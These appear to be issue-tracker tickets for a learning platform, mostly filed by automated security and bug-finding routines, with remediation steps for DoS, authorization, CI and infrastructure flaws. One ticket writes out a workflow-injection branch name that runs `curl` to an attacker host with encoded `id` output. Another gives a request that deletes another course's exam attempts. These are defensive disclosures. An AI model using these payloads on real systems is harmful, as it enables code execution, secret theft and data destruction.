Title: [security] no per-user WebSocket connection cap — authenticated Redis exhaustion DoS
Description:
R3 fingerprint: `<!-- agent-fp: b5781cc27ee7 -->`.

## Severity

**Medium**

## Location

* `apps/experts-realtime/src/server.ts` — upgrade handler (no per-user connection count check)
* `apps/experts-realtime/src/presence-redis.ts` — `incrWsConnectionCount` (presence counter only, no enforcement)
* `apps/experts-app/app/api/v1/internal/realtime/token/route.ts` — WS JWT with `ttlSeconds: 86_400` (24h TTL for authenticated users)

## Attacker → Input → Reach → Impact

* **Attacker**: Any authenticated user with a valid session.
* **Controlled input**: Repeated HTTP upgrade requests to `wss://socket.experts.com.sa/realtime?token=<jwt>` — reusing a single 24h token to open N simultaneous WebSocket connections.
* **Reachable path**:
  1. Attacker calls `POST /api/v1/internal/realtime/token` once — receives a JWT with `ttlSeconds: 86_400` (24 hours).
  2. Reuses this JWT to open thousands of simultaneous WebSocket connections against the realtime gateway.
  3. The upgrade handler verifies the JWT but applies **no per-user or global connection count limit** — `wss.clients` is never checked.
  4. `incrWsConnectionCount` is purely a presence counter with no enforcement branch.
  5. Each accepted WebSocket connection causes `ensureRedis()` to allocate a **dedicated** `ioredis` **subscriber connection** to Redis. With 64 channels subscribed per connection, each WS = one ioredis client.
  6. The existing `MSG_RATE_MAX=120/60s` rate limit governs messages per connection, not the number of concurrent connections.
* **Concrete impact**:
  * Attacker's hundreds of open connections exhaust Redis `maxclients` (default 10,000) from the realtime process's dedicated ioredis pool.
  * Redis connection errors cascade to other services that share the Redis instance: app workers (BullMQ), cron jobs, rate-limiting middleware, session store — effectively a Redis-wide DoS triggered by one authenticated user.
  * The realtime container also has no `mem_limit` (see [EXP-260](https://linear.app/experts/issue/EXP-260/security-realtime-container-has-no-memory-limit-websocket-exhaustion)), so the heap grows unboundedly, potentially triggering host-level OOM for co-located services.
  * The 24h JWT TTL means a compromised token provides a 24-hour attack window with no natural expiry forcing re-authentication.

## Why distinct from [EXP-260](https://linear.app/experts/issue/EXP-260/security-realtime-container-has-no-memory-limit-websocket-exhaustion)

[EXP-260](https://linear.app/experts/issue/EXP-260/security-realtime-container-has-no-memory-limit-websocket-exhaustion) covers the missing Docker Compose memory limits (infrastructure layer). This finding is the **application layer**: even with memory limits added, the per-ioredis-connection Redis exhaustion attack works independently and causes service disruption without needing to OOM the container. Both fixes are required.

## Recommended remediation

1. **Per-user connection cap** in the upgrade handler: before accepting the upgrade, read `incrWsConnectionCount`; if `count > MAX_WS_PER_USER` (e.g., 10 connections), write HTTP 429 and destroy the socket.
2. **Reduce WS JWT TTL**: change `ttlSeconds` from 86,400 s (24 h) to a shorter window (e.g., 3,600 s / 1 h), limiting the durable attack window for a leaked or hijacked token.
3. **ioredis connection pooling**: instead of one ioredis subscriber per WS connection, consider a shared subscriber-router pattern that multiplexes Redis subscriptions across a fixed connection pool.
4. **Redis** `maxclients` **guard**: set an explicit `maxclients` ceiling in Redis config for the realtime subscriber use case, distinct from the main application pool.

## Related prior issues

[EXP-260](https://linear.app/experts/issue/EXP-260/security-realtime-container-has-no-memory-limit-websocket-exhaustion) (realtime container no memory/CPU limit — complementary infrastructure fix required).

## Verified by

security-auditor subagent (examined `server.ts` upgrade handler, `presence-redis.ts`, `realtime/token/route.ts`).

*Filed by automated security routine on 2026-06-01T21:45:00Z.*
Creator: loooogix@gmail.com

Title: [spinoff: EXP-242] totalPages uncapped for in-memory sorts — clients receive unreachable page numbers
Description:
'<!-- agent-fp: `5aba1482425a989666b1dafe621186ba645b6d83` -->
<!-- spinoff-parent: [EXP-242](https://linear.app/experts/issue/EXP-242/bug-community-posts-get-loads-all-posts-without-limit-for) -->
<!-- spinoff-origin: R5 -->

**Trigger:** `apps/experts-app/app/api/v1/community/posts/route.ts:92` — `totalPages: Math.ceil(totalPosts / limit)` uses the full DB count from `prisma.post.count()` while in-memory sorts (`popular`/`discussed`) cap the actual fetch at `INMEM_SORT_CAP = 500` rows.

**What this fixes:** For in-memory sorts, the API reports e.g. 120 pages when there are 1,200 posts, but only 50 pages (500 rows / 10 per page) are actually reachable — pages 51+ return empty arrays. Clients following `totalPages` silently serve blank pages to users.

**Why this is agent-fixable:** Single-line fix: replace `totalPosts` with `Math.min(totalPosts, INMEM_SORT_CAP)` in the `totalPages` calculation for in-memory sort paths, paralleling the `take`-bound fix already in this handler. Move `INMEM_SORT_CAP` to module scope so the fix can reference it. Add one test asserting `totalPages <= INMEM_SORT_CAP / limit` when `postCount` stub returns a value above 500.

**Out of scope for THIS issue:** Replacing in-memory sort with DB-side aggregate join (a larger refactor) — the bounded over-fetch approach is intentional and acceptable; only `totalPages` accuracy needs to be fixed here.

Title: [spinoff: EXP-241] Fix stale isAdmin in GET /api/me — replace JWT claim with DB-fresh getUserPermissions
Description:
`<!-- agent-fp: 49e9b569f37a -->`
`<!-- spinoff-parent: EXP-241 -->`
`<!-- spinoff-origin: R5 -->`

## Trigger

`apps/experts-app/app/api/me/route.ts:61-77` — `const roles = session.user.roles ?? ["user"]; isAdmin: roles.includes("admin")`. The destructured form is not caught by the new `jwtRoleSelectors` ESLint rule added in [EXP-241](https://linear.app/experts/issue/EXP-241/securitysweep-jwt-derived-role-gates-db-fresh-sweep-across-the-app-exp) (which matches member-expression `<expr>.roles.includes(...)` only).

## What this fixes

`GET /api/me` returns internally inconsistent role data: `isInstructor` is DB-fresh (reads from DB user record) while `isAdmin` and `primaryRole` are derived from the stale JWT claim. After an admin is revoked in the DB, the `/me` endpoint continues reporting `isAdmin: true` until the JWT rotates — the exact staleness class [EXP-241](https://linear.app/experts/issue/EXP-241/securitysweep-jwt-derived-role-gates-db-fresh-sweep-across-the-app-exp) sweeps in all authz gates.

## Why this is agent-fixable

Replace the destructured `roles.includes("admin")` with `getUserPermissions(session.user.id)` (same helper used throughout the [EXP-241](https://linear.app/experts/issue/EXP-241/securitysweep-jwt-derived-role-gates-db-fresh-sweep-across-the-app-exp) sweep), derive `isAdmin` and `primaryRole` from `perms?.isAdmin`, add one revoked-admin test mirroring the pattern from the sweep PR.

## Out of scope for THIS issue

Changing the JWT rotation strategy, updating client UI rendering logic, or touching any other `/me` sub-resource.
Creator: loooogix@gmail.com

Title: [spinoff: EXP-241] Consolidate duplicate getDbCourseActor into single canonical export
Description:
`<!-- agent-fp: cc6c6cd680d4 -->`
`<!-- spinoff-parent: EXP-241 -->`
`<!-- spinoff-origin: R5 -->`

## Trigger

`apps/experts-app/app/api/v1/courses/[id]/modules/_lib/course-route-actor.ts` vs `apps/experts-app/src/lib/courses/catalog/guards/db-course-actor.ts` — two byte-for-byte identical implementations of the same DB-fresh course actor lookup. Both do `prisma.user.findUnique({ where: {id}, select: {isAdmin, isInstructor} })` and return `{isAdmin: Boolean(...), isInstructor: Boolean(...)}`.

Title: [bug] Release workflow has no force_build_realtime input — realtime image lags the release version
Description:
R3 fingerprint: `<!-- agent-fp: 7d65c8b1dd47 -->`.

## Severity

Medium — release/operational: deployed components drift to different versions, and there is no lever to correct it.

## Location

`.github/workflows/experts-app.yml` — `detect-changes` job (realtime detection, \~L134) and the `workflow_dispatch` inputs (\~L28–34).

## Problem

The release workflow exposes `force_build_app` and `force_build_worker` dispatch inputs, wired through `FORCE_BUILD_APP` / `FORCE_BUILD_WORKER` into the `Detect changed deployment areas` step (L122–127), so an operator can force those images to rebuild/push/recreate even when no source changed. **There is no** `force_build_realtime` **equivalent.**

Realtime's detect gate (L134) only sets `realtime=true` when `apps/experts-realtime/**` changes. Both the "Build and push realtime image" step (L446) and the "Restart realtime container" step (L552) are gated on that flag. So when a release bumps app/worker to a new version (e.g. `…-stable.3`) without touching realtime source:

* the realtime image is never rebuilt or retagged to the release version (no `experts-stg-realtime-v1.1.9-stable.3` tag is pushed),
* the realtime container is never recreated,
* and there is no operator lever to force it.

App and worker do not hit this because each `.1/.2/.3` release touched their source; realtime rarely changes, so it silently falls behind.

## Evidence (staging `docker ps`)

```
experts-stg-app          loogix/core:experts-stg-app-v1.1.9-stable.3
experts-stg-*-worker     loogix/core:experts-stg-worker-v1.1.9-stable.3
experts-stg-realtime     loogix/core:experts-stg-realtime-v1.1.9-stable     <- 3 versions behind
```

## Recommended fix (mirror the existing app/worker pattern)

1. Add a `force_build_realtime` `workflow_dispatch` input, identical in shape to `force_build_app` / `force_build_worker`.
2. Pass it as `FORCE_BUILD_REALTIME` env into the `Detect changed deployment areas` step.
3. In that step, after realtime change-detection: `if [ "$FORCE_BUILD_REALTIME" = "true" ]; then realtime=true; fi`.

With `realtime=true`, both the build/push (L446) and the container recreate (L552) fire, so the operator can re-run the release with `force_build_realtime=true` to bring realtime up to the current version. The `github-release` and `slack-notify` jobs already key their component lists off `BUILT_REALTIME`, so release notes stay consistent automatically.

## Operational follow-up (separate from the code fix)

Once merged, re-run the release with `force_build_realtime=true` (or manually build+push+`docker compose up -d --force-recreate --no-deps` the realtime service) to pull staging/prod realtime up to the current `-stable.N`.

## Out of scope

Auto-rebuilding realtime on every release regardless of changes (the change-gate default is intentional — this adds the missing manual lever, not a behavior change). Any retag-without-rebuild optimization.

## Related prior issues

[EXP-261](https://linear.app/experts/issue/EXP-261/security-migration-immutability-ci-guard-bypassed-by-direct-push-to) (same workflow file, distinct defect: the `migration-immutability` guard is `pull_request`-only).

## Verified by

Manual workflow trace (detect-changes → docker-release → deploy gating) cross-checked against the live `docker ps` version skew.

*Filed manually (Rule 4 dogfood) on 2026-06-02.*
Creator: loooogix@gmail.com

Title: [infra] Add container memory limits + Postgres memory tuning (postgres & realtime)
Description:
R3 fingerprint: `<!-- agent-fp: c3483b4cd2e6 -->`.

## Problem

No container in `docker/{production,staging,data}/docker-compose.yml` has a memory ceiling. On a VPS running multiple co-located containers this is a host-OOM hazard from two independent vectors:

* **Postgres (**`experts-prd-postgres`**)** — one bad query, migration, index build, or connection spike can let Postgres grow RSS until the kernel OOM-killer kills the DB container → **full-site outage** (live accounts, SAR payments, ZATCA invoices). This concern was believed tracked under [EXP-177](https://linear.app/experts/issue/EXP-177/security-production-postgres-image-pgvectorpgvectorpg16-uses-mutable) but [EXP-177](https://linear.app/experts/issue/EXP-177/security-production-postgres-image-pgvectorpgvectorpg16-uses-mutable)'s actual scope was image-tag pinning — so the postgres memory limit was never really filed until now.
* **Realtime (**`experts-prd-realtime`**)** — idle WebSocket connection-hold attacks grow the Node heap without bound → host OOM cascading to DB/app. (Folded in from [EXP-260](https://linear.app/experts/issue/EXP-260/security-realtime-container-has-no-memory-limit-websocket-exhaustion).)

## ⚠️ Correctness gotcha — use `mem_limit`, not `deploy.resources`

[EXP-260](https://linear.app/experts/issue/EXP-260/security-realtime-container-has-no-memory-limit-websocket-exhaustion) suggested `deploy.resources.limits.memory`. That key **only applies under** `docker stack deploy` **(Swarm)** and is **silently ignored by** `docker compose up -d` — which is how this stack deploys (see [EXP-251](https://linear.app/experts/issue/EXP-251/bug-pg18-volume-path-flip-deleted-migration-guide-production-data-loss)). Use the Compose-v2 standalone keys (`mem_limit` / `memswap_limit` / `shm_size`) so the limit actually takes effect.

## Remediation

**Postgres — container limit + in-DB tuning (don't set PG memory close to the container ceiling; leave room for WAL, pgvector, OS cache, bg workers):**

Staging (2 GB container):

```yaml
services:
  experts-stg-postgres:
    image: pgvector/pgvector:pg18
    mem_limit: 2g
    memswap_limit: 2g
    shm_size: 256m
    command:
      - postgres
      - -c
      - shared_buffers=512MB
      - -c
      - work_mem=8MB
      - -c
      - maintenance_work_mem=256MB
      - -c
      - max_connections=50
```

Production (4 GB container — size up if VPS RAM allows):

```yaml
    mem_limit: 4g
    memswap_limit: 4g
    shm_size: 512m
    command:
      - postgres
      - -c
      - shared_buffers=1GB
      - -c
      - work_mem=16MB
      - -c
      - maintenance_work_mem=512MB
      - -c
      - max_connections=75
```

**Realtime:**

```yaml
    mem_limit: 512m
    memswap_limit: 512m   # prevent swap exhaustion after the cap is hit
```

(`restart: unless-stopped` is already present, so Docker auto-restarts after an OOM kill. Per-IP/per-user WS connection caps are tracked separately in [EXP-262](https://linear.app/experts/issue/EXP-262/security-no-per-user-websocket-connection-cap-authenticated-redis) — complementary, not a substitute.)

Apply the same limits to all three compose files (`production`, `staging`, `data`), sized down for staging/data.

## Operator gate (why Backlog)

Production `mem_limit` / `shared_buffers` must be sized against actual VPS RAM — a design decision only the operator can confirm. **Not for autonomous R3 fix.** Move to Todo once sizing is chosen. Staging defaults (2g) above are safe to apply immediately.

## Related prior issues

[EXP-260](https://linear.app/experts/issue/EXP-260/security-realtime-container-has-no-memory-limit-websocket-exhaustion) (realtime mem limit — folded here), [EXP-262](https://linear.app/experts/issue/EXP-262/security-no-per-user-websocket-connection-cap-authenticated-redis) (per-user WS connection cap — distinct), [EXP-141](https://linear.app/experts/issue/EXP-141/security-r2-and-redis-credentials-committed-in-plaintext-to-git) (app container, same class), [EXP-251](https://linear.app/experts/issue/EXP-251/bug-pg18-volume-path-flip-deleted-migration-guide-production-data-loss) (postgres infra cluster).

Verified by: hand-filed during [EXP-251](https://linear.app/experts/issue/EXP-251/bug-pg18-volume-path-flip-deleted-migration-guide-production-data-loss) cluster grooming (operator-directed).
Creator: loooogix@gmail.com

Title: [infra] R2 has no automated backup/replication — object/bucket deletion is unrecoverable (no versioning)
Description:
R3 fingerprint: `<!-- agent-fp: dad0348c3622 -->`.

## Problem

Cloudflare R2 is the authoritative store for user uploads, course media, certifications, and **legally-immutable ZATCA invoices** — but there is **no automated backup or replication**, and **R2 has no built-in object versioning / undelete** (unlike S3). A single `DeleteObject`/`DeleteBucket`, lifecycle misconfig, leaked credential, CI cleanup script, or human dashboard mistake is therefore **unrecoverable**. A real bucket-loss incident has already occurred, which is exactly what this protects against.

The `backups` bucket and `R2_BACKUPS_URL` are already declared in env (`apps/experts-app/.env.example`, `docker/{production,staging}/.env`) but **nothing writes to them** — the bucket exists, the automation does not.

## Why `copy`, not `sync`

`rclone sync` mirrors deletions into the backup (an accidental primary delete instantly wipes the backup). Backups must use `rclone copy` (add/update only) plus **dated point-in-time prefixes** so a bad deploy or silent corruption can't erase history.

## Scope of THIS issue (R3-shippable, decision-free)

Mirror the existing Postgres backup tooling pattern. Acceptance criteria:

1. `scripts/r2-backup.sh` — `set -euo pipefail`; `rclone copy` each primary bucket (user-uploads, media, invoices, certifications) → the existing `backups` bucket under a dated prefix `backups/$(date +%F)/<bucket>/`. Idempotent, structured logging, non-zero exit on failure. Reads the rclone remote from a mounted config/secret (no inline creds).
2. `scripts/r2-restore.sh` — restore a given `--date <YYYY-MM-DD> --bucket <name>` prefix back to a target bucket. **Dry-run by default**, `--apply` to execute.
3. **Docker cron service** (compose profile, opt-in) running `r2-backup.sh` nightly, rclone config injected via Docker secret — same shape as the Postgres backup service.
4. **Runbook** `docker/R2-BACKUP.md` — rclone remote setup (R2 S3-compatible creds → `Provider: Cloudflare`, account endpoint), schedule, restore procedure, the `copy`-vs-`sync` rationale, and a **"bucket vanished? check Cloudflare Audit Logs"** root-cause checklist (Delete Bucket events, API-token activity, Wrangler/IaC runs, shared creds).

Use placeholders for all secrets/account IDs; never commit real credentials.

## Operator follow-up (NOT in the PR — design decisions)

* **Off-provider Layer 3** (disaster recovery): choose + provision Backblaze B2 / Wasabi / VPS cold archive, then add an `rclone copy backups → off-provider` step. Never rely on a single provider.
* **Retention policy**: suggested daily 14d / weekly 8w / monthly 12m — operator confirms numbers.
* Wire rclone creds as Docker secrets and **enable** the cron service in staging then production.
* Investigate the original bucket-loss root cause via Cloudflare Audit Logs and lock down any R2-deleting scripts/credentials.

## Related prior issues

[EXP-251](https://linear.app/experts/issue/EXP-251/bug-pg18-volume-path-flip-deleted-migration-guide-production-data-loss) (postgres infra/DR cluster — same "production data protection" theme).

Verified by: hand-filed during [EXP-251](https://linear.app/experts/issue/EXP-251/bug-pg18-volume-path-flip-deleted-migration-guide-production-data-loss) cluster grooming (operator-directed); the `backups` bucket exists with zero writers confirmed via repo grep.
Creator: loooogix@gmail.com

Title: [bug] exam reset POST does not validate examId belongs to courseId — BOLA cross-course attempt deletion
Description:
R3 fingerprint: `<!-- agent-fp: 4c24416c67be -->`.

## Trigger scenario

An instructor of Course A calls:

```
POST /api/v1/creator/courses/{COURSE_A_UUID}/exams/{COURSE_B_EXAM_UUID}/reset
Content-Type: application/json

{"userId": "{VICTIM_STUDENT_UUID}"}
```

1. `assertCourseWriteAccess({courseId: COURSE_A_UUID, userId: attacker, isAdmin: false})` **passes** — the attacker is a primary instructor on Course A.
2. No check is made that `COURSE_B_EXAM_UUID` belongs to Course A.
3. `prisma.courseExamAttempt.deleteMany({where: {examId: COURSE_B_EXAM_UUID, userId: VICTIM_STUDENT_UUID}})` executes.
4. All `CourseExamAnswer` and `CourseExamAttempt` rows for the victim student on Course B's exam are permanently destroyed. Response: `{"success": true}`.

The precondition — knowing Course B's exam UUID — is weak: exam UUIDs are exposed in normal API responses during any legitimate instructor tenure on that course. Since UUIDs never rotate, historical access to any course permanently enables the attack. A single former co-instructor satisfies all preconditions immediately.

## Root cause

`apps/experts-app/app/api/v1/creator/courses/[id]/exams/[examId]/reset/route.ts` — `POST` handler

The handler calls `assertCourseWriteAccess({courseId})` to verify the requester owns the URL's `[id]`, but never validates that `[examId]` belongs to that same course. The sibling GET and DELETE handlers on the same route both perform `prisma.courseExam.findFirst({where: {id: examId, courseId}})` before acting — the reset handler skips this check entirely.

```ts
// Current (broken):
const access = await assertCourseWriteAccess({courseId, userId: session.user.id, isAdmin});
// No exam→course ownership check before:
await prisma.courseExamAttempt.deleteMany({where: {examId, userId: targetUserId}});
```

## Suggested fix

Add the standard cross-exam ownership check before the deletes (mirrors the sibling DELETE/GET handlers):

```ts
const exam = await prisma.courseExam.findFirst({
  where: {id: examId, courseId},
  select: {id: true},
});
if (!exam) {
  return NextResponse.json({error: "Exam not found"}, {status: 404});
}
```

## Blast radius

`CourseExamAnswer` + `CourseExamAttempt` rows are permanently deleted (no soft-delete, no audit trail, no rate limit on the endpoint). A bulk attack against all known `(examId, studentId)` pairs can systematically wipe student progress and certification eligibility across an unrelated course. Recovery requires DB backup restore.

Related prior issues: none

Verified by: code-reviewer (static analysis) + qa-tester (trigger scenario + blast-radius assessment)

*Filed by automated bug-finder routine on 2026-06-02T08:00:00Z.*
Creator: loooogix@gmail.com

Title: [bug] handleCourseSubmit missing "pending" guard — instructor can double-submit while course is under review
Description:
## Summary

`handleCourseSubmit` in `apps/experts-app/src/lib/courses/catalog/handlers/course-submit.handler.ts` guards against re-submitting an **approved** course (added by [EXP-234](https://linear.app/experts/issue/EXP-234/instructor-can-re-submit-an-approved-course-silently-resetting-admin)) but has no guard for re-submitting a course that is already in `approvalStatus === "pending"` (currently under review).

An instructor can call the submit endpoint a second time while their course is in the review queue. The second call passes silently, updating `updatedAt` and potentially disrupting review queue ordering or invalidating in-flight reviewer state.

## Trigger scenario

1. Instructor submits course → `approvalStatus` transitions to `"pending"`.
2. Instructor (or a script) calls `POST /api/v1/creator/courses/{id}/submit` a second time before a reviewer acts.
3. No 409 is returned; the record is mutated (`updatedAt` refreshed); review queue position may change.

## Root cause

[EXP-234](https://linear.app/experts/issue/EXP-234/instructor-can-re-submit-an-approved-course-silently-resetting-admin) added:

```ts
if (current.approvalStatus === "approved") return 409;
```

Missing sibling guard:

```ts
if (current.approvalStatus === "pending") return 409; // or 422
```

## Suggested fix

```ts
if (current.approvalStatus === "approved" || current.approvalStatus === "pending") {
  return { ok: false, status: 409, error: "Course is already submitted or approved" };
}
```

## Dedup fingerprint

`7a77f4e88d1c` (`apps/experts-app/src/lib/courses/catalog/handlers/course-submit.handler.ts:handleCourseSubmit:broken-state-transition`)

Related prior issues: [EXP-234](https://linear.app/experts/issue/EXP-234/instructor-can-re-submit-an-approved-course-silently-resetting-admin) (resolved — added approved guard on same symbol)

Title: [security] GitHub Actions workflow injection via ${{ github.base_ref }} in migration-immutability job
Description:
R3 fingerprint: `<!-- agent-fp: 612635d18b4f -->`.

**Severity**: High

**File**: `.github/workflows/experts-app.yml` — `migration-immutability` job, step "Block edits to already-merged migrations"

**Attacker**: Any GitHub user who can open a pull request against logi-x/experts.

**Controlled input**: The PR base branch name, via `${{ github.base_ref }}`. GitHub allows branch names containing `'`, `;`, `|`, `&`, and `$()` — standard shell injection metacharacters.

**Reachable path**: The `migration-immutability` job runs on `pull_request` events that touch `apps/experts-app/prisma/migrations/**`. The `run:` step does:

```sh
base='${{ github.base_ref }}'
git fetch --no-tags origin "$base"
```

The template substitution `${{ github.base_ref }}` happens at workflow-render time, before bash sees the script. The surrounding `'` characters are literal rendered characters — not shell quoting. A branch named `main';curl${IFS}https://attacker.example/$(id|base64);#` would render as:

```sh
base='main';curl${IFS}https://attacker.example/$(id|base64);#'
git fetch --no-tags origin ...
```

— three separate shell commands, executing on the `changes-detector` self-hosted runner.

The same step also interpolates `${{ github.event.before }}` directly in the shell body. This is lower practical risk (GitHub normalizes push SHAs to 40 hex chars), but violates GitHub's own security guidance and should be fixed alongside `base_ref`.

**Impact**: Remote code execution on the persistent `changes-detector` self-hosted runner. Persistent runners retain artifacts between jobs. Secrets accessible to co-located jobs — including `EXPERTS_APP_DATABASE_URL` and `DOCKERHUB_TOKEN` — may be exfiltrated via env inspection or process table reads.

**Recommended remediation**: Move both context values to step-level `env:` and reference them as shell variables:

```yaml
env:
  GH_BASE_REF: ${{ github.base_ref }}
  GH_BEFORE: ${{ github.event.before }}
run: |
  set -euo pipefail
  base="$GH_BASE_REF"
  git fetch --no-tags origin "$base"
  before="$GH_BEFORE"
  ...
```

This makes the GitHub expression resolve to an environment variable string; injection metacharacters in the value cannot affect bash parsing.

Related prior issues: none

Verified by: dependency-auditor

Title: [security] Community post PUT allows owner to reverse admin unpublish — moderation bypass
Description:
R3 fingerprint: `<!-- agent-fp: 10787fbfd313 -->`.

**Severity**: Medium

**File**: `apps/experts-app/app/api/v1/community/posts/[id]/route.ts` — PUT handler, `...(body.isPublished !== undefined && {isPublished: body.isPublished})`

**Attacker**: Any authenticated community member whose post has been administratively unpublished.

**Controlled input**: `PUT /api/v1/community/posts/<uuid>` with body `{"isPublished": true}`.

**Reachable path**:

1. Admin calls `PUT /api/v1/community/posts/<postId>` with `{"isPublished": false}` to suppress violating content.
2. Post owner calls `PUT /api/v1/community/posts/<postId>` with `{"isPublished": true}`.
3. The PUT handler evaluates: `isOwner = existing.userId === session.user.id` → **true** for the post owner. `isAdmin` → false for the non-admin owner. The gate `if (!isOwner && !isAdmin) → 403` passes because `isOwner` is true.
4. The `isPinned` guard does **not** apply to `isPublished` — there is no equivalent admin-only guard on the `isPublished` write path.
5. `prisma.post.update({ data: { isPublished: true } })` executes. The post is live again.

**Impact**: An admin who unpublishes a post for content moderation (DMCA, hate speech, regulatory violation) has no durable enforcement mechanism. The post owner can immediately restore visibility by calling PUT `{isPublished: true}`.

**Recommended remediation**: Add an `adminLockedAt DateTime?` column to the `Post` model. While `adminLockedAt` is non-null a non-admin must not be able to mutate the post; only an admin may edit it (and, by re-publishing, clear the lock).

Verified by: security-auditor, architecture-reviewer

*Filed by automated security routine on 2026-06-02T08:30:00Z.*

Primary issue of PR2 in the [logi-x/experts#787](https://linear.app/experts/issue/EXP-291/cluster-community-posts-and-comments-api-hardening) cluster (`posts/[id]/route.ts`), shipping with the bug-class fixes [logi-x/experts#771](https://linear.app/experts/issue/EXP-277/bug-community-posts-delete-has-no-admin-bypass-admin-moderation-and) (DELETE admin bypass) and [logi-x/experts#783](https://linear.app/experts/issue/EXP-287/bug-get-communitypostsid-auth-moved-outside-try-block-unhandled) (auth() inside try) on the same file/diff. Title: [security] Community post creation POST has no rate limit — authenticated DoS and spam vector
Description:
R3 fingerprint: `<!-- agent-fp: 25ef3eed3a78 -->`.

**Severity**: Medium

**File**: `apps/experts-app/app/api/v1/community/posts/route.ts` — POST handler

**Attacker**: Any authenticated user (valid session token or cookie).

**Controlled input**: Repeated `POST /api/v1/community/posts` requests with a minimum-valid body (title ≥ 3 chars, content ≥ 1 char, valid category).

**Reachable path**: The POST handler flow is:

1. `auth()` — succeeds for any valid session.
2. `createPostSchema.safeParse(body)` — validates minimal required fields.
3. `prisma.post.create(...)` — writes to the `Post` table; `isPublished` defaults to `true` making each post immediately visible.
4. `prisma.embeddingSync.upsert(...)` — writes an embedding-sync row.
5. `enqueueEmbedOnPublish(...)` — enqueues a BullMQ job to the AI worker.
6. `publishFeedEvent("posts", "item_added", ...)` — fires a realtime event.

No `enforceUploadRateLimit`, sliding-window guard, or any other rate-limit is present anywhere in the handler. Compare: `/api/v1/internal/upload` calls `enforceUploadRateLimit` as its first post-auth action; community thumbnail routes do the same. The post-creation route is an unguarded gap.

**Impact**: A single authenticated account can:

* Spam-create posts at machine speed, filling the `Post` table and the community feed. All posts are published immediately and appear in the list GET (bounded to 500 rows by the recent [logi-x/experts#708](https://linear.app/experts/issue/EXP-242/bug-community-posts-get-loads-all-posts-without-limit-for) fix, but each spam post displaces real content in that window).
* Saturate the Redis feed pub/sub channel (`item_added` event per create).
* Exhaust the BullMQ embedding queue (one job per create, consumed by the AI worker).
* Drive repeated 500-row ILIKE scans on search queries.

Post schema allows 4 000-character bodies + 10 gallery URLs, making each create non-trivial in write cost. The rate of impact scales linearly with request throughput.

**Recommended remediation**: Apply `enforceUploadRateLimit` (or an equivalent per-user sliding window, e.g. 10 posts/minute) immediately after the `auth()` guard, before any DB writes.

Verified by: security-auditor

*Filed by automated security routine on 2026-06-02T08:30:00Z.*

## Collateral resolution

This finding ships together with [logi-x/experts#782](https://linear.app/experts/issue/EXP-286/bug-community-posts-get-populardiscussed-totalposts-reflects-full-db) (coherent pagination counts on the same `posts/route.ts`) as PR1 of the [logi-x/experts#787](https://linear.app/experts/issue/EXP-291/cluster-community-posts-and-comments-api-hardening) cluster. Title: [security] Pin + version-pump all container base images (Node 26.3.0, digest-pinned) — supply-chain hardening
Description:
R3 fingerprint: `<!-- agent-fp: bcd1d1b0ba51 -->`.  
Folded fingerprint (realtime Dockerfile): `<!-- agent-fp: 7230ce7a0a2c -->`.

**Severity**: Medium

## Problem

Multiple container base images were pulled via **mutable, floating tags** instead of immutable digests, so the next build/deploy silently pulled whatever sat at the tag — a supply-chain RCE vector for any service holding production secrets (cron sidecar, AI/PDF/ZATCA workers, realtime gateway). The fleet was also split across **three Node majors** (24 / 22, plus a bare `node:24-alpine`), so "the rest of the stack is pinned" was only partly true.

Scope was widened from the two originally-reported services (prod cron + realtime — fingerprints `bcd1d1b0ba51` / `7230ce7a0a2c`) to a **full container-fleet sweep**: unify on **Node 26.3.0** and digest-pin every base image. This is the class-level fix rather than two instance patches.

## Fix — every base image now version-pumped + digest-pinned

Two canonical Node 26.3.0 digests are used everywhere:

* **bookworm-slim**: `node:26.3.0-bookworm-slim@sha256:79723b41edbedf595f62e943a9f8b0ba9af5b1e61045c5f8f59c2c02c1212a16`
* **alpine3.23**: `node:26.3.0-alpine3.23@sha256:144769ec3f32e8ee36b3cfde91e82bee25d9367b20f31a151f3f7eea3a2a8541`

| File | Before | After |
| -- | -- | -- |
| `.nvmrc` | `24` | `26` |
| `apps/experts-app/Dockerfile` (`base`) | `node:24.12.0-bookworm-slim` | bookworm-slim digest (+ `npm i -g corepack@latest --force`) |
| `apps/experts-app/Dockerfile.worker` (`base`) | `node:24.12.0-bookworm-slim` | bookworm-slim digest (+ `npm i -g corepack@latest --force`) |
| `apps/experts-prisma/Dockerfile` | `node:24-alpine` | alpine3.23 digest (now `AS builder`) |
| `apps/experts-realtime/Dockerfile` (`builder` + `runner`) | `node:22-alpine` ×2 | alpine3.23 digest ×2 |
| `docker/production/docker-compose.yml` (`experts-prd-cron`) | `alpine:3.23` | `alpine:3.23.4@sha256:5b10f432ef3da1b8d4c7eb6c487f2f5a8f096bc91145e68878dd4a5019afde11` |

Also updated for the Node 26 pump: root + per-app `package.json` and `pnpm-lock.yaml` (`experts-app`, `experts-prisma`, `experts-realtime`).

**Post-sweep check**: `grep -rnE 'FROM (node|alpine):[0-9]' --include='Dockerfile*' apps/ docker/ | grep -v @sha256` → **no matches**. Every `FROM` and compose `image:` is digest-pinned.

## Verification

* Built the staging images locally and brought the stack up — all 8 staging containers running; `experts-stg-app` and `experts-stg-realtime` report **healthy** (`experts-stg-cron`, `-ai-worker`, `-pdf-worker`, `-zatca-worker`, `-redis`, `-postgres` up).
* Toolchain confirmed on Node `v26.3.0` (`node -v`, `nvm current`).

## Follow-up

Add digest-update automation (Dependabot Docker or equivalent) so the pins stay current instead of drifting back to stale-but-pinned.

Related prior issues: [EXP-91](https://linear.app/experts/issue/EXP-91/security-jwt-role-staleness-on-put-apiv1eventsid-revoked-admin) (resolved — same finding class on `redis:latest` in production docker-compose).

Verified by: platform-operator + local staging build (operator-tested).

Title: [devops] Add Docker digest-update automation (Dependabot) — keep pinned base images current
Description:
R3 fingerprint: `<!-- agent-fp: 2925412d3273 -->`.

**Severity**: Low (hardening follow-up) — **not** an auto-fixable bug; requires a devops decision on cadence/grouping, so deliberately kept out of the R3 auto-fix lane (no `bug`+`Todo`).

## Context

[EXP-282](https://linear.app/experts/issue/EXP-282/security-pin-version-pump-all-container-base-images-node-2630-digest) (PR #777, merged `9b4beb31`) digest-pinned every container base image and pumped the fleet to Node 26.3.0. Digest pins eliminate the floating-tag supply-chain risk, but introduce the opposite failure mode: a pinned digest **goes stale** — the image stops receiving OS/CVE patches until someone manually re-resolves the digest. Without automation, "pinned" silently decays into "pinned to an old, vulnerable image."

## Ask

Add automated digest-update PRs so pins stay current:

* `.github/dependabot.yml` with `package-ecosystem: docker` entries covering every Dockerfile dir (`apps/experts-app` app + worker, `apps/experts-prisma`, `apps/experts-realtime`) **and** the compose files under `docker/production` / `docker/staging` (Dependabot supports `docker-compose` image refs).
